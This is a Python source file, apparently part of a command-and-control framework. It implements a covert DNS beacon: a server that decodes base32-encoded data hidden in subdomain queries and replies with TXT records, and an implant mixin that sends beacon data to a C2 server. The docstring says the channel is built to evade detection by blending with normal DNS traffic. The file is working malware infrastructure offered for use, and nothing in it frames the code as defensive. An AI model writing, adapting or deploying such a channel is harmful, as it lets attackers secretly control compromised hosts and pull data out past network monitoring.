"""c2-37 DNS beacon — C2 communication over DNS queries.

Encodes C2 data in DNS TXT record queries/responses.
Slower but harder to detect — blends with normal DNS traffic.
Uses stdlib only (no dnspython needed).
"""
from __future__ import annotations

import base64
import json
import socket
import struct
import threading
import time
from typing import Optional


class DNSBeacon:
    """DNS-based C2 channel.

    Data is encoded in subdomain labels and returned in TXT records.
    Format: <encoded_data>.<session_id>.c2.example.com

    The DNS server decodes the subdomain, processes it,
    and returns the response as a TXT record.
    """

    def __init__(self, domain: str = "c2.example.com", dns_port: int = 5353):
        self.domain = domain
        self.dns_port = dns_port
        self._server: Optional[socket.socket] = None
        self._running = False
        self._callbacks: dict[str, callable] = {}

    # ── Encoding ──

    @staticmethod
    def encode_data(data: bytes, max_label: int = 63) -> list[str]:
        """Encode binary data as DNS-safe labels (base32, chunked)."""
        encoded = base64.b32encode(data).decode().rstrip("=").lower()
        return [encoded[i:i+max_label] for i in range(0, len(encoded), max_label)]

    @staticmethod
    def decode_data(labels: list[str]) -> bytes:
        """Decode DNS labels back to binary data."""
        encoded = "".join(labels).upper()
        # Add padding
        padding = (8 - len(encoded) % 8) % 8
        encoded += "=" * padding
        return base64.b32decode(encoded)

    @staticmethod
    def encode_json(data: dict) -> list[str]:
        """Encode a JSON dict as DNS labels."""
        return DNSBeacon.encode_data(json.dumps(data).encode())

    @staticmethod
    def decode_json(labels: list[str]) -> dict:
        """Decode DNS labels to a JSON dict."""
        return json.loads(DNSBeacon.decode_data(labels))

    # ── DNS Packet Helpers ──

    @staticmethod
    def _build_dns_response(query_data: bytes, txt_records: list[str]) -> bytes:
        """Build a DNS response packet with TXT records."""
        # Parse query header
        tx_id = query_data[:2]
        # Find question section end
        pos = 12
        while query_data[pos] != 0:
            length = query_data[pos]
            pos += 1 + length
        pos += 5  # null byte + qtype(2) + qclass(2)

        # Build response header
        flags = 0x8180  # Standard response, no error
        header = tx_id + struct.pack("!HHHHH", flags, 1, len(txt_records), 0, 0)

        # Copy question section
        question = query_data[12:pos]

        # Build answer section
        answers = b""
        for txt in txt_records:
            txt_bytes = txt.encode()
            answers += b"\xc0\x0c"  # pointer to name in question
            answers += struct.pack("!HHI", 16, 1, 60)  # TXT, IN, TTL=60
            txt_rdata = bytes([len(txt_bytes)]) + txt_bytes
            answers += struct.pack("!H", len(txt_rdata))
            answers += txt_rdata

        return header + question + answers

    @staticmethod
    def _parse_query_name(data: bytes) -> str:
        """Extract the queried domain name from a DNS packet."""
        labels = []
        pos = 12  # skip header
        while data[pos] != 0:
            length = data[pos]
            pos += 1
            labels.append(data[pos:pos+length].decode(errors="replace"))
            pos += length
        return ".".join(labels)

    # ── Server ──

    def on_beacon(self, callback):
        """Register callback for beacon data. callback(session_id, data) -> response_dict"""
        self._callbacks["beacon"] = callback

    def start(self, background: bool = True):
        """Start the DNS C2 server."""
        self._server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind(("0.0.0.0", self.dns_port))
        self._running = True

        if background:
            t = threading.Thread(target=self._serve, daemon=True)
            t.start()
        else:
            self._serve()

    def _serve(self):
        while self._running:
            try:
                self._server.settimeout(1.0)
                data, addr = self._server.recvfrom(4096)
                threading.Thread(
                    target=self._handle_query,
                    args=(data, addr),
                    daemon=True
                ).start()
            except socket.timeout:
                continue
            except Exception:
                break

    def _handle_query(self, data: bytes, addr: tuple):
        """Handle incoming DNS query."""
        try:
            name = self._parse_query_name(data)

            # Check if it's for our domain
            if not name.endswith(self.domain):
                return

            # Extract encoded data from subdomains
            prefix = name[:-len(self.domain)-1]  # strip .domain
            parts = prefix.split(".")

            if len(parts) < 2:
                return

            # Last part before domain is session ID, rest is data
            session_id = parts[-1]
            data_labels = parts[:-1]

            # Decode the beacon data
            try:
                beacon_data = self.decode_json(data_labels)
            except Exception:
                beacon_data = {"raw": prefix}

            # Process through callback
            response = {"status": "ok"}
            if "beacon" in self._callbacks:
                response = self._callbacks["beacon"](session_id, beacon_data) or response

            # Encode response as TXT records
            resp_json = json.dumps(response)
            # Split into 255-byte chunks for TXT records
            txt_records = [resp_json[i:i+255] for i in range(0, len(resp_json), 255)]

            # Send DNS response
            dns_resp = self._build_dns_response(data, txt_records)
            self._server.sendto(dns_resp, addr)

        except Exception:
            pass

    def stop(self):
        self._running = False
        if self._server:
            self._server.close()


class DNSImplantMixin:
    """Mixin for Implant class to add DNS beacon capability.

    Usage in implant:
        class MyImplant(Implant, DNSImplantMixin):
            def __init__(self, ...):
                super().__init__(...)
                self.dns_domain = "c2.example.com"
                self.dns_server = "10.10.10.10"
                self.dns_port = 53
    """

    def dns_beacon(self, data: dict) -> dict:
        """Send beacon data over DNS and get response."""
        labels = DNSBeacon.encode_json(data)
        session_id = getattr(self, "id", "0000")

        # Build query name: <data_labels>.<session>.<domain>
        qname = ".".join(labels) + f".{session_id}.{self.dns_domain}"

        # Build DNS query packet
        tx_id = struct.pack("!H", int(time.time()) & 0xFFFF)
        flags = struct.pack("!H", 0x0100)  # Standard query
        counts = struct.pack("!HHHH", 1, 0, 0, 0)

        # Encode name
        name_bytes = b""
        for label in qname.split("."):
            name_bytes += bytes([len(label)]) + label.encode()
        name_bytes += b"\x00"

        # TXT query
        question = name_bytes + struct.pack("!HH", 16, 1)  # TXT, IN

        query = tx_id + flags + counts + question

        # Send query
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        try:
            sock.sendto(query, (self.dns_server, self.dns_port))
            response, _ = sock.recvfrom(4096)

            # Parse TXT records from response (simplified)
            # Find answer section and extract TXT data
            txt_data = self._extract_txt(response)
            if txt_data:
                return json.loads(txt_data)
        except Exception:
            pass
        finally:
            sock.close()

        return {}

    @staticmethod
    def _extract_txt(response: bytes) -> str:
        """Extract TXT record data from DNS response."""
        try:
            # Skip header (12 bytes)
            pos = 12
            # Skip question
            while response[pos] != 0:
                pos += 1 + response[pos]
            pos += 5  # null + qtype + qclass

            # Parse answer
            result = ""
            # Skip/handle name pointer
            if response[pos] & 0xC0 == 0xC0:
                pos += 2
            else:
                while response[pos] != 0:
                    pos += 1 + response[pos]
                pos += 1

            # Type, class, TTL, rdlength
            rtype = struct.unpack("!H", response[pos:pos+2])[0]
            pos += 8  # type + class + ttl
            rdlength = struct.unpack("!H", response[pos:pos+2])[0]
            pos += 2

            if rtype == 16:  # TXT
                txt_len = response[pos]
                result = response[pos+1:pos+1+txt_len].decode()

            return result
        except Exception:
            return ""
